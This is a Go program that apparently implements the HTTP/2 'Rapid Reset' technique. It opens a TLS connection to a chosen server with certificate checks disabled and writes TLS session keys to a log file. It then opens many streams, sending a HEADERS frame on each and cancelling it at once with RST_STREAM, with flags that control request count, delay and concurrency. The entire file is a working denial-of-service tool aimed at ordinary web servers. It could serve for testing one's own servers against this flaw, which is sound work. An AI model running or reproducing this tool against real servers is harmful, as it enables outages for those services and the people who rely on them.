package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"math"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
	"os"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var numRequests int
var concurrencyLimit int
var serverURLStr string
var streamCounter uint32
var waitTime int
var delayTime int
var sentHeaders, sentRSTs, recvFrames int32
var headerStart, headerEnd time.Time

func init() {
	flag.IntVar(&numRequests, "requests", 5, "Number of requests to send")
	flag.StringVar(&serverURLStr, "url", "https://localhost:443", "Server URL")
	flag.IntVar(&waitTime, "wait", 0, "Wait time in milliseconds between starting workers")
	flag.IntVar(&delayTime, "delay", 0, "Delay in milliseconds between sending HEADERS and RST_STREAM")
	flag.IntVar(&concurrencyLimit, "concurrency", 0, "Maximum number of concurrent worker routines")
	flag.Parse()
}

func sendRequest(framer *http2.Framer, mu *sync.Mutex, path string, serverURL *url.URL, delay int, doneChan chan<- struct{}) {
	defer func() {
		doneChan <- struct{}{} 
	}()

	var headerBlock bytes.Buffer

	encoder := hpack.NewEncoder(&headerBlock)

	encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: serverURL.Host})

	streamID := atomic.AddUint32(&streamCounter, 2) 
	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: headerBlock.Bytes(),
		EndStream:     true,
		EndHeaders:    true,
	}); err != nil {
		fmt.Printf("[%d] Failed to send HEADERS: %s", streamID, err)
	} else {
		atomic.AddInt32(&sentHeaders, 1)
		fmt.Printf("[%d] Sent HEADERS on stream %d\n", streamID, streamID)
	}

	time.Sleep(time.Millisecond * time.Duration(delay))

	if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
		fmt.Printf("[%d] Failed to send RST_STREAM: %s", streamID, err)
	} else {
		atomic.AddInt32(&sentRSTs, 1)
		fmt.Printf("[%d] Sent RST_STREAM on stream %d\n", streamID, streamID)
	}

}

func printSummary() {
	elapsed := headerEnd.Sub(headerStart).Seconds()
	fmt.Printf("\n--- Summary ---\n")
	fmt.Printf("Frames sent: HEADERS = %d, RST_STREAM = %d\n", sentHeaders, sentRSTs)
	fmt.Printf("Frames received: %d\n", recvFrames)
	fmt.Printf("Total time: %.2f seconds (%d rps)\n\n", elapsed, int(math.Round(float64(sentHeaders)/elapsed)))
}

func main() {
	keylog := flag.String("keylog", "ssl-keylog.txt", "File name to write NSS key log format log of TLS keys")
	flag.Parse()

	kl, err := os.OpenFile(*keylog, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	if err != nil {
		panic(err)
	}
	defer kl.Close()

	serverURL, err := url.Parse(serverURLStr)
	if err != nil {
		log.Fatalf("Failed to parse URL: %v", err)
	}

	headerStart = time.Now()
	streamCounter = 1

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		KeyLogWriter: kl,
	}

	conn, err := tls.Dial("tcp", serverURL.Host, tlsConfig)
	if err != nil {
		log.Fatalf("Failed to dial: %s", err)
	}

	_, err = conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
	if err != nil {
		log.Fatalf("Failed to send client preface: %s", err)
	}

	framer := http2.NewFramer(conn, conn)
	var mu sync.Mutex

	mu.Lock()
	if err := framer.WriteSettings(); err != nil {
		log.Fatalf("Failed to write settings: %s", err)
	}
	mu.Unlock()

	go func() {
		for {
			frame, err := framer.ReadFrame()
			if err != nil {
				if err == io.EOF {
					return
				}
				fmt.Printf("Failed to read frame: %s", err)
			} else {
				atomic.AddInt32(&recvFrames, 1)
				fmt.Printf("Received frame: %v\n", frame)
			}
		}
	}()

	for {
		frame, err := framer.ReadFrame()
		if err != nil {
			fmt.Printf("Failed to read frame: %s", err)
		}
		if _, ok := frame.(*http2.SettingsFrame); ok {
			break
		}
	}

	path := serverURL.Path
	if path == "" {
		path = "/"
	}

	concurrency := concurrencyLimit
	doneChan := make(chan struct{}, concurrency)

	for i := 0; i < numRequests; i++ {
		time.Sleep(time.Millisecond * time.Duration(waitTime))
		go sendRequest(framer, &mu, path, serverURL, delayTime, doneChan)
	}

	for i := 0; i < numRequests; i++ {
		<-doneChan
	}

	headerEnd = time.Now()

	printSummary()
}
